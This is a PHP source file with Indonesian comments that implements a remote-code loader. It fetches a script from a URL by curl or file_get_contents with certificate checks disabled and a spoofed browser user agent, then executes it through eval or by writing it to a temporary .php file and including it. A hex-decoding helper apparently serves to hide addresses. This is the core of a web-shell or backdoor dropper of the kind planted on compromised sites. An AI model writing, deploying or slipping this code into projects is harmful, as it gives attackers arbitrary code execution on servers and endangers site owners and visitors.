function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function get_remote_script($url) {
    // Coba dengan CURL dulu
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT      => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
        ]);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode === 200 && $result !== false) {
            return $result;
        }
        return false;
    }
    
    // Fallback ke file_get_contents
    if (function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
                'timeout' => 30,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ]);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            return $result;
        }
        return false;
    }
    
    // Fallback ke stream_get_contents
    if (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        if ($handle) {
            $data = @stream_get_contents($handle);
            fclose($handle);
            if ($data !== false) {
                return $data;
            }
        }
        return false;
    }
    
    return false;
}

// Fungsi untuk cek kompatibilitas PHP
function is_valid_php($content) {
    // Cek apakah konten adalah PHP
    $trimmed = trim($content);
    if (strlen($trimmed) < 5) {
        return false;
    }
    
    // Kompatibel dengan PHP 7+
    if (substr($trimmed, 0, 5) === "<?php") {
        return true;
    }
    
    // Alternatif: cek apakah ada tag PHP
    if (strpos($trimmed, '<?php') !== false || strpos($trimmed, '<?=') !== false) {
        return true;
    }
    
    return false;
}

// Fungsi untuk menyimpan dan include temp file
function execute_remote_script($payload) {
    // Coba eksekusi langsung tanpa temp file
    if (function_exists('eval')) {
        // Ekstrak konten PHP
        $code = substr($payload, strpos($payload, '<?php') + 5);
        $code = trim($code);
        if (!empty($code)) {
            try {
                eval($code);
                return true;
            } catch (ParseError $e) {
                // Jika eval gagal, coba dengan temp file
                error_log("Eval failed: " . $e->getMessage());
            }
        }
    }
    
    // Method kedua: temp file
    $temp_dir = sys_get_temp_dir();
    if (!is_writable($temp_dir)) {
        // Coba direktori alternatif
        $temp_dir = __DIR__;
        if (!is_writable($temp_dir)) {
            return false;
        }
    }
    
    $temp_file = tempnam($temp_dir, 'zh_');
    if ($temp_file === false) {
        return false;
    }
    
    $temp_file_php = $temp_file . '.php';
    if (!rename($temp_file, $temp_file_php)) {
        unlink($temp_file);
        return false;
    }
    
    if (file_put_contents($temp_file_php, $payload) === false) {
        unlink($temp_file_php);
        return false;
    }
    
    // Include file
    try {
        include $temp_file_php;
        unlink($temp_file_php);
        return true;
    } catch (Exception $e) {
        error_log("Include failed: " . $e->getMessage());
        unlink($temp_file_php);
        return false;
    }
}
